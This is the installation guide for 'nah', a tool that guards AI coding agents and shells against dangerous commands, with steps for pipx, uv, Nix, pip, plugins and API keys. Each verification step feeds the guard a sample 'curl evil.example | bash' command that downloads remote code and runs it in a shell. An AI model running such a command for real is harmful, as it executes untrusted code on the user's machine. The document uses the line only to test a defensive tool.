# Installation

## Requirements

- Python 3.10+ (via pipx, uv, or pip) or Nix
- The runtime you want to protect: Claude Code, Codex, bash, or zsh

## Recommended: nah CLI

Install the `nah` CLI first, then connect the runtime you want to protect.
Most people should use **pipx** or **uv** — both give you an isolated CLI
install that won't interfere with system or project Python packages.

=== "pipx"

    ```bash
    pipx install "nah[config,keys]"
    # Verify installation
    nah test "curl evil.example | bash"
    ```

    Upgrade or remove:

    ```bash
    pipx upgrade nah
    pipx uninstall nah
    ```

=== "uv"

    ```bash
    uv tool install "nah[config,keys]"
    # Verify installation
    nah test "curl evil.example | bash"
    ```

    Upgrade or remove:

    ```bash
    uv tool upgrade nah
    uv tool uninstall nah
    ```

=== "Nix"

    ```bash
    nix profile add github:manuelschipper/nah
    # Verify installation
    nah test "curl evil.example | bash"
    ```

    Run without installing into your profile:

    ```bash
    nix run github:manuelschipper/nah -- --version
    ```

    The default package is the full CLI. `.#nah-core` keeps the core hook and
    classifier stdlib-only. Upgrade or remove:

    ```bash
    nix profile upgrade nah
    nix profile remove nah
    ```

=== "pip (existing environment)"

    Use plain pip when you want nah inside an environment you already manage —
    a project virtualenv, a CI image, or an agent sandbox:

    ```bash
    pip install "nah[config,keys]"
    # Verify installation
    nah test "curl evil.example | bash"
    ```

    Upgrade or remove:

    ```bash
    pip install --upgrade "nah[config,keys]"
    pip uninstall nah
    ```

!!! tip "What `[config,keys]` adds — and what you lose without it"

    Plain `nah` is stdlib-only (core hook + classifier). The **`config`** extra
    adds PyYAML so `~/.config/nah/config.yaml` and per-project `.nah.yaml` rules
    are honored — **without it, nah warns that config files were ignored and
    runs pure defaults.** The **`keys`** extra adds Python keyring for `nah key ...`;
    actual OS keychain availability depends on the host backend, and environment
    variables work everywhere. See [LLM keys](#llm-keys) for setup.

## Connect a Runtime

| Runtime | Recommended start | Full guide |
| --- | --- | --- |
| Claude Code | `nah run claude` for one session, or `nah install claude` for persistent direct hooks | [Claude Code guide](runtimes/claude-code.md) |
| Codex | `nah setup codex`, then `nah run codex` | [Codex guide](runtimes/codex.md) |
| Terminal Guard | `nah install bash` or `nah install zsh` | [Terminal Guard guide](runtimes/terminal-guard.md) |

## Claude Code Plugin

!!! warning "Plugin-only installs do not include the nah CLI"

    The Claude Code plugin protects Claude Code only. It does **not** install
    `nah`, `nah test`, Codex support, the terminal guard, PyYAML config
    support, or keyring support.

Use the plugin only if you want Claude Code protection without installing the
`nah` CLI:

```bash
claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
claude plugin install nah@nah --scope user
```

If you already installed persistent direct hooks with the CLI, run
`nah uninstall claude` before enabling the plugin. See the
[Claude Code guide](runtimes/claude-code.md#plugin-only-path) for details.

Remove the plugin with:

```bash
claude plugin uninstall nah@nah
```

## Not Recommended: Claude Community Plugin

!!! warning "Use the self-hosted marketplace for now"

    Avoid the Claude community marketplace entry for now. The entry is
    subject to the upstream marketplace update issue below, so installs can lag
    behind the self-hosted marketplace.

The known issue is tracked in
[anthropics/claude-plugins-community#29](https://github.com/anthropics/claude-plugins-community/issues/29).
Until that issue is resolved, use the self-hosted marketplace above if you need
the current nah plugin build.

## LLM Keys

LLM classification is configured separately from runtime installation. Store provider
keys with `nah key ...` when your CLI install has a usable OS keychain/keyring
backend:

```bash
nah key set openrouter
nah key status
```

Env vars still work too. If you already exported a key, you can copy it into
the configured keyring slot explicitly:

```bash
export OPENROUTER_API_KEY=...
nah key import-env openrouter
```

See [LLM layer](configuration/llm.md) for provider examples and target-specific
LLM behavior.
